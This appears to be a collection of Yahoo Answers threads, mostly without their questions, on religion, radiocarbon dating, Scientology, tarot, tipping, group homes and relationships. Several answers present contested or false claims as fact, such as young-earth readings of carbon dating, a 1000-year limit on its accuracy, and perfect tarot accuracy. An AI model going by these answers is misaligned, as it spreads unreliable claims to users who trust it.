kD4BBKARaa	The disciples were first called "Christians" in Antioch, Syria:    "And when he had found him, he brought him unto Antioch. And it came to pass, that a whole year they assembled themselves with the church, and taught much people. And the disciples were called Christians first in Antioch."- Acts of the Apostles 11:26.

And why is it now?  Catholicism I assume.|`|ch9ipCTKaa	The following quote is taken from the Constitutions of the Twelve Apostles, which lists the bishops of the various Churches that were ordained by the apostles themselves or recognized by them and this writing was scribed by Clement of Rome, one of the 1st century Churchs earliest Bishop's and is said in the Bible to be in the Book of Life.    Now concerning those bishops which have been ordained in our lifetime, we let you know that they are these:--James the bishop of Jerusalem, the brother of our Lord; upon whose death the second was Simeon the son of Cleopas; after whom the third was Judas the son of James. Of Caesarea of Palestine, the first was Zacchaeus, who was once a publican; after whom was Cornelius, and the third Theophilus. Of Antioch, Euodius, ordained by me Peter; and Ignatius by Paul. Of Alexandria, Annianus was the first, ordained by Mark the evangelist; the second Avilius by Luke, who was also an evangelist. Of the church of Rome, Linus the son of Claudia was the first, ordained by Paul; and Clemens, after Linus' death, the second, ordained by me Peter. Of Ephesus, Timotheus, ordained by Paul; and John, by me John. Of Smyrna, Aristo the first; after whom Strataeas the son of Lois; and the third Aristo. Of Pergamus, Gains. Of Philadelphia, Demetrius, by me. Of Cenchrea, Lucius, by Paul. Of Crete, Titus. Of Athens, Dionysius. Of Tripoli in Phoenicia, Marathones. Of Laodicea in Phrygia, Archippus. Of Colossae, Philemon. Of Borea in Macedonia, Onesimus, once the servant of Philemon. Of the churches of Galatia, Crescens. Of the parishes of Asia, Aquila and Nicetas. Of the church of AEginae, Crispus. These are the bishops who are entrusted by us with the parishes in the Lord; whose doctrine keep ye always in mind, and observe our words. And may the Lord be with you now, and to endless ages, as Himself said to us when He was about to be taken up to His own God and Father. For says He, "Lo, I am with you all the days, until the end of the world. Amen."     This writing was compiled from Clement's recordings later in the 4th century by the same men that the Lord used to compile those writings we today call the Canon of Holy Scripture or "The Holy Bible".     This writing is, and has always been, accepted by all Churches that can back date to the apostles era.|`|5d8a3c03e0eaed818f8bcdc8c279bf5faa	You know that a church is a 2 or more people  Right? Paul is the one who went to preach the 1st message to Rome  Paul did not come into the picture until 4 years after the death and Resurrection of Christ However After Christ arose, Before Paul's time,. (paul did not meet Christ On this earth in his human body) The Church was in hiding, Behind closed doors and shuttered windows, where they would only pray in hiding, for fear of the Romans, They where out to kill off the followers of Christ. Allot of what you ask is in the book of Acts. The same Paul holds the garment of Steffen as he was stoned to death.  And it is the romans you want to know about here too is not that right,.    It was after Paul's transformation In the book of acts, as he went to capture the followers of Christ in a north east in Jerusalem, controled by the romans. as they where like police

kD4BBKARaa	We have then been buried with him, etc. He now begins to indicate the object of our having been baptized into the death of Christ, though he does not yet completely unfold it; and the object is -- that we, being dead to ourselves, may become new creatures. He rightly makes a transition from a fellowship in death to a fellowship in life; for these two things are connected together by an indissoluble knot -- that the old man is destroyed by the death of Christ, and that his resurrection brings righteousness, and renders us new creatures. And surely, since Christ has been given to us for life, to what purpose is it that we die with him except that we may rise to a better life? And hence for no other reason does he slay what is mortal in us, but that he may give us life again.    Let us know, that the Apostle does not simply exhort us to imitate Christ, as though he had said that the death of Christ is a pattern which all Christians are to follow; for no doubt he ascends higher, as he announces a doctrine, with which he connects, as it is evident, an exhortation; and his doctrine is this -- that the death of Christ is efficacious to destroy and demolish the depravity of our flesh, and his resurrection, to effect the renovation of a better nature, and that by baptism we are admitted into a participation of this grace. This foundation being laid, Christians may very suitably be exhorted to strive to respond to their calling. Farther, it is not to the point to say, that this power is not apparent in all the baptized; for Paul, according to his usual manner, where he speaks of the faithful, connects the reality and the effect with the outward sign; for we know that whatever the Lord offers by the visible symbol is confirmed and ratified by their faith. In short, he teaches what is the real character of baptism when rightly received. So he testifies to the Galatians, that all who have been baptized into Christ, have put on Christ. (Galatians 3:27.) Thus indeed must we speak, as long as the institution of the Lord and the faith of the godly unite together; for we never have naked and empty symbols, except when our ingratitude and wickedness hinder the working of divine beneficence. - [Calvin].|`|1iKEQ6yYaa	Baptism, sets forth a persons identification with Christ in His death,burial and resurrection  [Matthew 28:17-20]|`|6lJuKKMHaa	lol.

Sooner or later, he won't try  to hide a thing, providing he isn't telling the truth. If he's tired of you,  he'll start making it harder to live with him. Just to see how much you  could take before splitting the sheets as they used to say. Save your  self respect. Do not beg or ask him to marry you. Buy a smaller bed.  And also buy an elongated pillow you can tuck into bed with you.  They are about the length of a normal mattress and where I used to  work at one time, they had them in the luggage department. There is  a special name for them.       I used to know a woman from the internet,who described an almost  identical situation as yours. He slept in the den, with the hidebed and  another TV. She used the same bedroom. He worked a different  shift, and slept days. She worked three jobs part time. They hardly  ever saw each other, except when the other was sleeping. The man  seemed to not be interested in her anymore, and they were married.  She told me of an affair she had before and after with someone she  met over the internet. It fizzled,and she settled back into the old  routine. Both were miserable. I never learned what the outcome was.  Since she stopped writing.      As for sleeping alone, it's something you learn to get used to. My  husband started having low back pain and couldn't use a bed. And  I bought several models before quitting at the $1,000.00 model. Now  he sleeps in his recliner and is contented. I used the bed,until a car  accident, gave me a problem using a bed. Now I too use a recliner.  So we know if we want relief from low back pain, we have no other  choice but to lay back in our chairs and sleep. You can get used to  sleeping alone, if you know you have to. Don't lower yourself to beg  for anything. No one is worth that humility. Split and find someone  who can appreciate you. Change your appearance and enhance your  best features. Bring out the hidden 'you'. Start going places with  friends, after work or on a weekend. Get away from the house/apt.  as often as you can. Don't make yourself so available.

bUJjjFinaa	Yes. Countless times. ..Of  course there are times when I don't feel His presence, but we should never rely on our feelings. We should rely on our faith. We need to know that God is faithful and He ALWAYS keeps His promises. He promises to always be there, and He promises to always love us. There is no love like God's love. He is an AWESOME GOD! ..I cannot tell you how many times He has SAVED me from my sure destruction. I have fallen astray from God's word numerous times. And each time, the enemy seeks that out as a grand opportunity to wreak havok in my life. If it were not for God's endless love and grace, I would be in horrible shape. Who knows where I'd be right now.    Praise Jesus! =D|`|o9Ckf0h4aa	Yes, to all of your questions.It came from a time of worship, every time as you said.|`|mNJFttV6aa	It's awesome, and the best part is that someday we'll never step outside His presence!

I love when I go to this place I love when I truly found out about Him and how awesome He is.  I can feel Him almost walking next to me.  I feel Him at church.  It is one of the best feelings there is out there.  I can also feel Him sometimes when I can't believe something turned out the way it did and I am sitting there happy or when something truly amazing or good happened in my day that was unexpected.  I can see and feel Him touching my life in many ways.|`|16bWGB14aa	I haven't felt his presence as strongly as you have, but I have felt his Presence. I was at church camp and during worship I got these goosebumps and for the rest of the night I could feel that he was really there and I just felt so much love. It was awesome and I hope it happens again.|`|i81cQUyhaa	Yes I Have. When You draw close to God and deny Yourself He fills You with His Spirit. It's a Wonderful experience.|`|6rwIm5Gnaa	Yes. Before God answered a prayer directly, which was the greatest gift, something happened. I was sitting and all of the sudden I felt really good. It was something I have never experienced ever. Next, I was attack by a demon and saw it (I know, sounds crazy). Then my prayer was answered. Then I found this is how spiritual warfare works. It attacks the light right away and I was recieving some light when God answered my prayer. Now I cant be shaken from knowing God is real and true.

xRCynGQqaa	Radiocarbon dating (C14 dating) is credible.    The fact that it works can be easily verified, simply by dating things we already know the exact age of.     It works fine on its own from about 150 - 2000 years ago.    Beyond that it gets a bit murky due to the variable amount of  C14 in the biosphere.    Fortunately, we now have calibration tables, compiled from the growth rings of the Bristle cone Pine (Pinus Aristata) that tell us exactly how much atmospheric/biospheric carbon 14 was present in the environment at the time those rings were grown. So, by overlaying the rings from different trees of different ages we have compiled a continuous record of biospheric carbon.    These calibration tables have pushed the useability of C14 dating back to about 11,000 years ago.    Beyond that the margin or error increases & we don't have calibration tables to compensate.    So, basically the answer is: Yes, it is credible and is a very useful tool, however, it has limitations.|`|97oxJ0B8aa	I don't know where you'll find an unbiased answer to this question.  But, No, I don't think it is used in a credible manner.  It seems very different results can be received from the same object over multiple tests and then the scientists will just pick the results that fit with what the "geological rock layer chart says" and go with that.  So if they didn't come to a certain artifact with a predetermined range of ages then the carbon dating would be useless.  And the geological column doesn't seem to have a leg to stand on either.  There is my (probably biased) opinion.|`|YZv8Ub3Haa	1.  Independent measurements, using different and independent radiometric techniques, give consistent results (Dalrymple 2000; Lindsay 1999; Meert 2000). Such results cannot be explained either by chance  or by a systematic error in decay rate assumptions.       2. Radiometric dates are consistent with several nonradiometric dating methods. For example:              * The Hawaiian archipelago was formed by the Pacific ocean plate moving over a hot spot at a slow but observable rate. Radiometric dates of the islands are consistent with the order and rate of their being positioned over the hot spot (Rubin 2001).              * Radiometric dating is consistent with Milankovitch cycles, which depend only on astronomical factors such as precession of the earth's tilt and orbital eccentricity (Hilgen et al. 1997).              * Radiometric dating is consistent with the luminescence dating method (Thompson n.d.; Thorne et al. 1999).              * Radiometric dating gives results consistent with relative dating methods such as "deeper is older" (Lindsay 2000).        3. The creationist claim that radiometric dates are inconsistent rest on a relatively few examples. Creationists ignore the vast majority of radiometric dates showing consistent results (e.g., Harland et al. 1990).        as for carbon dating specifically:       1.  Any tool will give bad results when misused. Radiocarbon dating has some known limitations. Any measurement that exceeds these limitations will probably be invalid. In particular, radiocarbon dating works to find ages as old as 50,000 years but not much older. Using it to date older items will give bad results. Samples can be contaminated with younger or older carbon, again invalidating the results. Because of excess 12C released into the atmosphere from the Industrial Revolution and excess 14C produced by atmospheric nuclear testing during the 1950s, materials less than 150 years old cannot be dated with radiocarbon (Faure 1998, 294).          In their claims of errors, creationists do not consider misuse of the technique. It is not uncommon for them to misuse radiocarbon dating by attempting to date samples that are millions of years old (for example, Triassic "wood") or that have been treated with organic substances. In such cases, the errors belong to the creationists, not the carbon-14 dating method.       2. Radiocarbon dating has been repeatedly tested, demonstrating its accuracy. It is calibrated by tree-ring data, which gives a nearly exact calendar for more than 11,000 years back. It has also been tested on items for which the age is known through historical records, such as parts of the Dead Sea scrolls and some wood from an Egyptian tomb (MNSU n.d.; Watson 2001). Multiple samples from a single object have been dated independently, yielding consistent results. Radiocarbon dating is also concordant with other dating techniques (e.g., Bard et al. 1990).|`|5tMCDu8gaa	As someone who is even vaguely familiar with biochemistry could tell you, yes it is.|`|lQGwzBoJaa	From what I've read, carbon 14 dating is accurate between 5000-50,000 years.|`|AA11297267	Some great answers already.  Here's an objective and honest look at radiocarbon dating specifically, spelling out what works and what doesn't:    http://hyperphysics.phy-astr.gsu.edu/hba...    Note that radiocarbon dating as a sole indicator of a date has a fairly large margin of error -- that is always honestly reported when this dating method is used.  The observed general error from Carbon 14 dating tends to be to *under-estimate* the age of the sample, and that's part of the margin of error that's given when a date is calculated.  (that blows most creationist objections out of the water, by the way, because the Carbon 14 method's typical under-age error means that all the stuff we test, if we're off, is really *older* than the carbon 14 test says it is).    The best way to date objects is to use multiple, independent methods and see how well they agree and where they overlap.  That produces the most reliable and supportable ages.    Peace.|`|6DQSkKgWaa	As far as we know, radiocarbon dating is credible assuming the source being tested is uncontaminated and the tester uses proper procedure.|`|Kbry7CnOaa	Yes, back until about 5000 years it is perfect (That is why Christians think it think it supports their notion of a 6000 year old Earth).     After that it is + or - a few to a few hundred years depending on how old the object is. After 50,000 years it becomes unreliable, after which we use dating methods based on radioactive isotopes.     It is a method which has been fine tuned using objects of a known age and is very accurate.    ED: And yes Zri what you say is very biased and untrue (that is breaking one of your commandments isn't it...)|`|tEn2nnsuaa	radiocarbon dating is ABSOLUTELY credible. I included a wiki article about it just to give you an overview of how it works. it's based on proven physical laws.|`|58f6965a53c947ccce835659f1d0d228aa	Carbon dating is only accurate to only about 1000yrs.  After that it is completely unpredicable!|`|oxUFlfPvaa	I tried but it's not the same as being with an actual woman.|`|TEtOq1XCaa	My belief as a born-again, fundamentalist, bible-believing Christian is that radiocarbon dating (like any other scientific technique), can be useful, but is not 100% accurate.    That is to say, the evidence suggests we may be able to make useful estimates from the amount of radiocarbon in a sample, but these estimates are estimates only, and are based on certain assumptions that are not always valid (which is why some dates conflict, and some are not consistent with historical records). It is also the reason why Christians can believe in a 6000 year old earth and accept the principles of C-14 dating (although they may have different dating assumptions to evolutionists).    Note that the presence of radiocarbon in a sample is excellent evidence that the sample is less than 50,000 years (excellent evidence for a "young" or 6000 year old earth). The presence of C-14 within ancient fossils, carbonate rocks, coal and diamonds (often dated by other radiometric methods to be millions of years) demonstrates these things are much younger than previously thought.|`|lEPGcFqFaa	Carbon dating, like evolution, is full of fallacies and assumptions.  The outside limit of carbon dating is 40 thousand years.  The assumption is that the same amount of carbon had to be in the atmosphere through out time.  For instance, did you know there has been found, a seal over three hundred years old?  Fact, that and other oddities.

XEbrGfZuaa	You start with a nice Valentine, stating from your heart, exactly how  you feel about him. There's no need to buy him anything. Not unless  you have gone with him for a long time, and feel you really need to.  It's up to him to give you something, more in gift form, than you to  him. And here again, it depends on how long you've gone together.     Since guys all like food, and some more than a gift, take him out  to lunch at his favorite place for a burger and fries and shake. And  give him his card after eating. You could do this at a nice restaurant  as well. Especially one with a view.       If you really need a gift, buy a small charm in sterling, match it to  a like chain, and have him wear it close to his heart to remind him of  you. There's nothing more romantic than that. The charm has to have  a special meaning, only the two of you understand. Maybe it was  something you did on a date, you could find a charm of. A skate for  skating. Or maybe a telephone, or a computer, if you got to know  each other more through one or the other. Something to describe  where you fell for him. It only needs to be suggestive. Just your  little secret.|`|lX52IMfFaa	condoms.|`|RV967urRaa	Get him a box of chocolates or some kind of candy.

VERrlErvaa	When I used to read tarot cards, (before I found Christ), I was accurate in my readings.  I did them over the internet and through E-bay - I received a 100% success rate.     I have also encountered dark energy at historical sites such as Port Arthur in Tasmania, which has a very checkered past - it was a penal colony, a small township (burnt by fire) and finally a tourist attraction.  It was also the scene of a mass-murder - the worst in Australian history by the killer Martin Bryant.    I have seen apparitions and prefer to keep my distance from such things, as they can be very dangerous.    I believe there are people who are sensitive to energy; that places such as battlefields can contain dark energy due to the amount of death that took place on them or places where murders took place.  Dark energy, I believe is demonic and used by Satan.|`|ki8kdpJPaa	It has been extensively disproved by science.|`|eb9a693cbdde8fd29f4eff3ed378d62baa	guess what I'm thinkin right now....|`|aBHY2iXraa	Here's my psychic prediction: There is a black cloud over the White House    Obama dies: I predicted that  America goes to war: I predicted that  Obamas kids get measles: I predicted that  America goes into a depression: I predicted that  A politician gets jailed for corruption: I predicted that    See how it works.

This program constituted the single largest infiltration of the United States government in history.

Tax Fraud - One of the only reasons they enjoy "tax exempt status" on religious ground in the United States is because they bullied the IRS into a "deal" through extremely aggressive barratry (which is the offense of persistently instigating groundless lawsuits) against said government agency and its officials, and arranged to drop all 2,500 frivolous lawsuits only when an "agreement" was reached. In addition, Scientology's lawyers hired private investigators to dig up any "dirt" on IRS agents which was then used to blackmail or publicly smear all "vulnerable" agents.   http://legalminds.lp.findlaw.com/list/fe...   http://www.lermanet.com/scientologynews/...   http://www.factnet.org/headlines/give-aw...   http://www.cs.cmu.edu/~dst/Cowen/essays/...      Fair Game - the Scientology policy detailing how the organization may confront & handle critics & perceived enemies. Here is a direct quote: "Enemies may be deprived of property or injured by any means by any Scientologist without any discipline of the Scientologist. May be tricked, sued or lied to or destroyed. Though they claim this policy is no longer in effect, Scientology still goes to great lengths to bully all known critics, opponents, enemies, etc, often through malicious litigation & character assassination, even going so far as to falsely accuse them of crimes.   http://www.xenu.net/archive/disk/fairgam...  http://www.fairgamed.org/   http://www.solitarytrees.net/racism/hara...   http://www.youtube.com/watch?v=ocw90W44B...

Sssh!|`|AA10985325	From my experience Scientology works.  The Church of Scientology is currently expanding and the churches and missions are there to suppprt Scientologists and deliver Scientology couselling and training . They do a good job. They also help and participate in their local communities to improve conditions in a very real and effective way.  Most of the people posting answers to your question have no actual knowledge about this religion. They just give opinions and comments based on rumors they have heard from others or read in the media.     So heres a factual description for you (From a Scientologist):    Scientology is a new religion. It is an applied religious philosophy. By applied is meant that it is for use in life and  living. You actually use it in your day to day life to change and improve existing conditions. It is a practical religion.  All religions if you study them have a basic philosophy, but they also have certain dogma, rituals and observances and a certain faith or belief is required. There is nothing wrong with this , but Scientology is not that kind of religion. It acknowledges the principle of God or the Supreme Being but does not try to define or describe this principle,  leaving it up to the individual.  It is also not a messianic religion. This means there is no worship of prophets or messiahs or gods. It is not belief or faith based. In Scientology a truth is true for you according to your own observation and experience .  The dictionary definition that applies:    Religion: The spiritual or emotional attitude of one who recognises the existence of superhuman power or powers.    The most basic principle of Scientology is that YOU are your own immortal soul, that this is not a thing you have but what YOU actually are.  Scientology believes or considers that Man is basically good. This is different from many religions that promote that he his natively evil or bad unless made good.    The whole purpose of Scientology knowledge application and procedure is to increase an individuals understanding and awareness of himself as a spiritual being and to rehabilitate his native abilities and potential.  When you do this there sphere and zones of his positive influence increases and moves outward into his life , his family and friends, his groups and Mankind of which he is part .    How this result is achieved is the technology of Scientology, which was developed by L Ron Hubbard from discoveries he made after  extensive research into the field of the mind and the human spirit.  Some of this knowledge was already existing in the sacred lore of ancient texts like the Veda or Vedic Hymns going back 10,000 years. New and additional discoveries were  made about the nature of the human spirit and fully recorded and codified .  Scientologys closest spiritual ties with any other religion are with Orthodox (Hinayana ) Buddhism with which it shares an historical lineage. But even here the relationship is based mainly on friendship and the recognition of the being as a spirit rather than any organizational ties.    L.Ron Hubbard published 18 basic books from 1950 to 1955 to fully communicate the basic principles of Scientology, the path of his research and the technology that  he developed from this.   He completed all his research before his death in 1986 and left all his materials and copyrights to the Church of Scientologys Religious Technology Centre along with most of his personal estate when he died.    The Church of Scientology is currently established iand operating internationally in over 160 countries world wide. However it is still a new religion, less than 55 years old.  The true story of Scientology as a religion goes like this:  1. A philosopher developes a philosophy about life and death.  2. People find it interesting.  3. People find it works.  4. People pass it along to others.  5. It grows.    This is just an overview.  L.Ron Hubbard explained fully the theology and technologies of Scientology in more than 500,000 pages of writings, including dozens of books and over 3,000 tape recorded public lectures.|`|AA11521494	It has been defined as not a religion in British law as it has no god nor public worship services.  What it actually believes is so off the wall that it is not revealed to Scientologists until a late stage, by which time they have already been well brainwashed into believing anything.  It will present itself as being a new kind of philosophy and means of psychiatric therapy, but under that it is somewhat dangerous and also very expensive.|`|AA11225089	I know someone who got caught up in it, it's completely a cult.

It is teleological in that it aims at practice, or a way of life. It is normative, in that it is concerned with providing standards of both morality, or right and wrong, and teleology, or right purpose. And it is orienting, in that religions offer an account of the nature of human beings, the universe, and the relationship between the two.    We would define religion, then, in this way: religions are bodies of doctrine that specify a way of life centered on the maximization of the good, where the good includes both morality and right purpose."     That's why my Church is a bonafide religion.  We have all of those factors.    You can see those here:  http://www.scientology.org|`|AA10498197	I can understand why you would ask that.    Christianity was a Jesus cult when it started, now the entire world's dating system is done AD - Anno Domini (in the year of our Lord).    The Mormon religion is considered a cult by some.    Scientology is new and not well understood, and what it teaches is so fundamentally different from everything we've known in the past (like Christianity first was - the forgiveness of sins without offering animal sacrifices? HA!) that it will take some time to be accepted.    I've seen things which many learned minds have said is impossible, so I tend to keep an open mind.      Now, the CHURCH of Scientology is abusing it's members, of which I am not.  They do good work, for a price.  Everyone deserves to be compensated for their work, very expensive work, however they require things that are unnecessary.      Someday someone will clean it up.
EmOnt7FIaa	First of all, I'm not 100% what your trying to say because your explanation is not that coherent. Doesn't a big boy like you know any grammar? lol, just kidding.    Ok, where do I begin?    You can't just run away to a different country.    Do you have a job in a different country?  Will you be able to get a job in that country?   Do you need citizenship to obtain a job there?  How well does a job in that industry pay there?    What about housing?  Do you really want to sleep in the streets until you find adequate housing?  Did you place a Security Deposit on a rental property?    What about a car?  Do you need to apply for a new license once you get there?  Will you be confused because of some places drive on the opposite side of the road?  Will your car insurance cover you in a foriegn nation?    Do you have any unpaid bills in America?  Credit Card Bills, unpaid Parking Tickets?    Are you aware of their legal system?  In some countries, they will publicly execute you for things considered socially acceptable in America.    Can you speak their language?    Oh and I forgot.............your not going anywhere without a Visa/papers. So I recommend you apply for them, and guess what, they definately don't come overnight.

Q3WweuOCaa	All wrong. I'm a manager. The average, and I mean average to expect is 15%, unless your table is cheap. Not everyone tips 15%. Also, servers make around $2. 17 an hour. The minimum wage is for something else, like anything besides serving ; dishwashing for example. Oh, and sitting at the counter makes no difference at all. You don't walk into a diner, a restaurant or a bar without expecting to tip 15%. At the VERY least. Me? I tip 25% or I stay home.|`|m2QSWdnraa	15-20% of the bill before any discounts.  If you live in California just double the tax.    edit: sleek is wrong, servers make minimum wage.

I know servers make well below the minimum wage. Not exactly sure the amount. I assume it depends on the restaurant.    Edit: the roleplayer: The law in Texas (where I live), states that minimum wage applies only to those who don't make tips and do not make commission. I have several friends who make anywhere between $3.00 and $4.50 as server while minimum wage is $6.55.|`|H8s18HMMaa	For food servers...    If you are sitting down at a table or booth, 15% minimum, even for poor service, 20% for average to good service, and 25% for outstanding service.  If you are sitting at a counter, you only need to tip 12-18%, depending on the quality of service.  For wine, $2-5 per bottle, or 10-15% of the wine bill.  At fancy restaurants, $1 per 1-2 coats.  Percentages should be applied BEFORE tax and BEFORE coupon.  If you have a coupon, don't apply that to the tip, because the server is still doing the same amount of work.    Servers are allowed to get less than minimum wage since they are tipped.  Hourly wages range from $1.50-10, depending on the quality of restaurant and the work involved.    I hope this helped.  :)|`|5OwtbkK3aa	Minimum wage generally only applies to chains. Independent restaurants are NOT required to pay minimum wage as long as the tips the server is given equal at least minimum wage.   Now, to answer the question, in most European countries, servers are paid very well (generally a LIVING wage) and tipping is not expected. There are some restaurants in the US that do the same, but very few, and even some of those automatically add a "service" fee to the check.

FvoxgjbJaa	The Catholic Church is One, Holy and Apostolic, founded by Jesus Christ, true God and true Man, outside of which there is absolutely no salvation.     The student is not greater than the Teacher.     You are a student.     It does not strike me that you are genuinely looking for answers but rather that you have made up your mind already concerning these "questions." After all you tell us that you were raised a Catholic until the age of 12. Hence it sounds like you have apostatized. If I am correct this would throw some doubt onto your claim not to "judge, pervert or slander" the Catholic Faith.     For those who have left the Ark of salvation, who not unlike those who were outside the Ark of Noah and perished, Protestants, erroneously think that they can search the Scriptures and interpret them correctly. In fact the Scriptures warn us of these very things. Surely you must have come across such passages in Sacred Scripture or am I correct in presuming you are not using the Scriptures approved by the Catholic Church.     As a retired teacher of the true Catholic Faith, after having read your many questions concerning it, you need to know that the Catholic Faith, in a final punishment to those who have left Her and to those who obstinately remain outside of Her, has been taken away and is to be found only in remote locations. This is the result of changes that followed what was called the Vatican II Council.    "You shall seek me, and shall not find me..."    North Africa was once Catholic; not anymore. Europe was once the seat of Christendom; not anymore. The true Catholic Church, the bride of Christ, is walking the Way of the Cross. What does Scripture say about the return of Christ? Do you think He will find faith when He returns. The gates of Hell (heretics) will not prevail against the Church, and out of grace, a remnant shall be preserved.|`|XsTJPMHqaa	-Christ claimed the apostolic Church to be the only way. If you believed Scripture to be inspired by God and a source of Divine Revelation by which to form doctrine: "[W]hat you have heard from me before many witnesses entrust to faithful men who will be able to teach others also" (2 Tim. 2:2). This references St. Paul, who ordained St. Timothy, and instructed him to ordain others. This shows apostolic Succession in Scripture itself. Also:  "You are Peter {rock}, and on this rock I will build my Church, and the gates of hell will not prevail against it" (Matt. 16:18). So the Church has been founded upon St. Peter    The Just War Doctrine: http://www.catholic.com/library/Just_War... The Spanish Inquisition was just that, Spanish. The Spanish Government is responsible for the autrocities committed there. It's also wise to take note that this was the common way of dealing with heretics against the government at that time - Protestant England was doing the same things to Catholics.    Confession: "As the Father has sent me, even so I send you. . . . Receive the Holy Spirit. If you forgive the sins of any, they are forgiven; if you retain the sins of any, they are retained" (John 20:2123).  This is told only to the Apostles, who then passed it on, and passed it on...see "Apostolic Succession". Scripture says to not pray as the pagans do, who believe they will be heard for their many words, not that repitition in an of itself is vain. Christ Himself prayed the same prayer three times in the Garden of Gesthemene before His Passion. Are you suggesting Christ prays vainly?    The Church says we do not know the official judgement of a soul unless they have been Canonized. We make no statements regarding the salvation of non-Catholics, because we are not God and thus not qualified to make that judgement. We do say that anyone saved is saved by the graces Our Lord channels through His Church - His tool.    Rome has said that the images of fire were used probably as a metaphor, but that hell itself is still a very real place of extreme torment. Everyone there is struggling against their very soul to get farther and farther away from the Source of All Goodness - how can it not be unbearable? It's unnatural. Nevertheless many souls would rather run from God then swallow their pride and obey - Satan included.    There are deeper issues here. Catholic.com is a great place to learn why the Church does as she does, or teaches as she teaches.|`|WRn8YipZaa	Are you seriously asking for fathers, priests, and bishops here?    Anyways:    1. No one says the Catholic Church is the only way. If that's what you were taught, then you were taugh wrong.    2. The Crusades began when the Seljuk turks were attacking the Christian Byzantine Empire to expand their own huge empire and spread Muslim rule. They also were persecuting Christians in the Holy Land. The Byzantine Emperor asked the pope for assistance against the Muslims and he agreed for the sake of Christianity. While the later Crusades had different agendas i would say atleast the start of the Crusades was justifiable.    3.

So, I will not try to answer your questions per your request.  I will make a couple of suggestions of good places to find the info that you seek.    1. the Catechism of the Catholic Church.  If you were a Catholic, then you might have one of these around or your parents might have one that you could borrow.  It gives in there why the church believes what it believes along with scripture references.  You can also do an online search of the CCC at the US Conference of Catholic Bishops website.    2. The Catholic Answers website.  They are an apologetics group that has a call in radio show and apologists line for anyone seeking answers on the Catholic faith.  They would love to answer your questions.    3.  You can also check out Scripture Catholic's website.  I was just there looking up resources on the deuterocanonical books.    4.  I almost forgot.  Catholic Answers also has a web forum where you can check out others who have posted similar questions and their responses.      5.  Some other good books:  Catholicism and Fundamentalism by Karl Keating, any books by Scott Hahn, Born Fundamentalist Born Again Catholic by David Currie, Surprised By Truth I, II, and III.      Those are all of the resources that I can think of at this time.  I hope that they help you in your quest for answers.|`|FGcwxZz0aa	LOL!! Aren't you aware of the limitations of this forum. I could write volumns about each of these issues you raise.    Why don't you try this.....ask one question at a time so that you can get some beneficial answers.     I assure you that if you believe that there is any conflict or contradictory teaching in the Catholic Church to Scriptures you will be disappointed. here is my blog site where I have already answered many of these questions:    http://blog.360.yahoo.com/blog-S6YMuFYya...

BevylvVSaa	Adult foster care homes are owned by people who live in their homes and open it up to seniors or people with disabilities who have no where to live. In most states they have a maximun of 5 or 6 residents.     Group homes are businesses who have no owner in residence. They can be small or large. The push is to have homes with no more than 4, but 12 used to be quite common and some specialty-built homes have had many more than that. I know of one with 24 residents.    They are similar in that they both must be licensed, their residents usually pay their way with Medicaid or Medicare, they get all their meals, transportation to medical appointments included in the cost. Group home are more likely to be reside in by younger people than Adult Foster Care homes.|`|y3V0R26aaa	there's no adult foster care|`|PnlgLBcwaa	group homes and foster care are 2 different things    In my state, group homes are genrally run by non profit social service agencies....which receive funding from various sources...The ones I worked in were not funded by medicaid.  the residents mostly worked in sheltered workshops and received SSI......The SSI/workshop pay (which might only be $10-$100/week at that time) paid the 'rent' and for food and clothes and entertainment....There was some other state funding taht went toward operating costs (staff, set up, etc.)...These homes were for people with developmental disabilities who generally had no academic skills (they were just warehoused when teh were school age instead of educated).  Some had more skills-mostly the younger ones who were given opportunites in school and at home when they were growing up.    There are various models of groups homes--a single family house with 3-6+ bedrooms--1 or 2 people to a room (preferably 1)    groups of 2 BR apartments in 1 building where staff can float between apartments or have 1 staff/apartment depending on level of need    There are also higher levels of inpendence--independent apartments where staff is not on site-but available by phone/as needed    Semi independent apartments where there is an on site satff apartment teh residents can go to as needed-or teh staff can go to teh resident if tehy need help--but there is not supervison most of teh day.    Some people would like everyone to live independently, but that is not reality...in some instance it would require around teh clock 1:1 care.  Some people need the assistance of a group home....I have worked with adults that cannot even get themselves a bowl of cereal or make a sandwich---and need to be reminded to get dressed in the morning.  And it is normal for young adults to have roommates-especially in todays economy.....|`|5UHxvDn8aa	As the other poster said, they are two different things.  In a group home you will usually live with many other people in a similar situation as yourself.  You will go to groups where people will talk.  You will also cook and clean with your fellow residents, and maybe spend free time together.  It isn't a horrible situation, though it isn't always great.    With adult foster care, you will live with a family and perhaps there would be another person who is also in adult foster care living there too.  I've heard stories where families only take on individuals for adult foster care so that they have a person to clean their house:  the family is made up of slobs and you have to do all of the work.  I'm sure it could also work well, too.      So anyway,  those are the basic differences.  If you have a choice, make sure you do your homework and look at all of your options.  Also if there is a social worker available to go over the options with you that would be great.  And if the social worker would check in with you after you have been placed that would be swell, too.|`|AA11560792	no when your in foster care foster parents get payed for taking care of you and your needs.. when your in a group home its generally staffed for the needs of others...my friend was in a foster home when he turned 18 his foster parents put him out cause they didn't receive a check anymore for him cause he turned 18 and it stopped... he didn't have no where to go so he joined a gang.. and the member he was with shot someone and killed  a man  and now hes in jail for life... i think there should be some kind of program that when foster kids turn 18 they should be helped with liefs skills and not  throwed away like garbage... alot of foster parents don't care about the kids they only foster them for the money......

"What powerful rivers!"  "What beautiful animals!"  He said to himself.     As he was walking alongside the river, he heard a rustling in the bushes behind him.  He turned to look.  He saw a 7-foot grizzly bear charging towards him.             He ran as fast as he could up the path.  He looked over his shoulder and saw that the bear was closing in on him.     He looked over his shoulder again, and the bear was even closer. He tripped and fell on the ground.  He rolled over to pick himself up but saw that the bear was right on top of him, reaching for him with his left paw and raising his right paw to strike him.                                                 At that instant the Atheist cried out, "Oh my God!"     Time Stopped.          The bear froze.                  The forest was silent.    As a bright light shone upon the man, a voice came out of the sky.  "You deny my existence for all these years, teach others I don't exist, and even credit creation to cosmic accident.  Do you expect me to help you out of this predicament?  Am I to count you as a believer?"    The atheist looked directly into the lightand said, "It would be hypocritical of me to suddenly ask you to treat me as a Christian now, but perhaps you could make the BEAR a Christian?"    "Very Well," said the voice.     The light went out.  The sounds of the forest resumed.  And the bear dropped his right paw, brought both paws together, bowed his head & spoke:     "Lord bless this food, which I am about to receive from thy bounty through Christ our Lord, Amen."|`|9dOfxwuIaa	Have a fate in something?

